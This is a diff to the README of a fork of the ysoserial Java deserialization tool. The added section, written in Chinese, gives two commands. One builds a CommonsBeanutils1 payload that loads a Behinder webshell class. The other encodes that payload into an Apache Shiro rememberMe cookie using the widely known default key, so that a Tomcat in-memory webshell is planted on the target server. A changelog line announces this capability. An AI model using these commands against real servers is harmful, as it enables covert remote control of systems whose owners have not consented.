@@ -1,6 +1,17 @@
 
 # ysoserial
 
+### shiro 内存马注入
+
+使用对应链进行生成反序列化文件
+`java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 classfile:./Poc/shell/BehinderLoader.class > demo.ser`
+指定加密模式和反序列化文件生成对应的 rememberMe
+`java -jar ysoserial-0.0.6-SNAPSHOT-all.jar ShiroRememberMeEncode cbc:kPH+bIxk5D2deZiIxcaaaA==:./demo.ser`
+
+### 更新日志
+2021.0525 可以引入构造好的 class 直接进行 shiro Tomcat 内存马注入，同时可直接调用加密函数进行加密
+
+
 [![Join the chat at https://gitter.im/frohoff/ysoserial](
     https://badges.gitter.im/frohoff/ysoserial.svg)](
     https://gitter.im/frohoff/ysoserial?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)
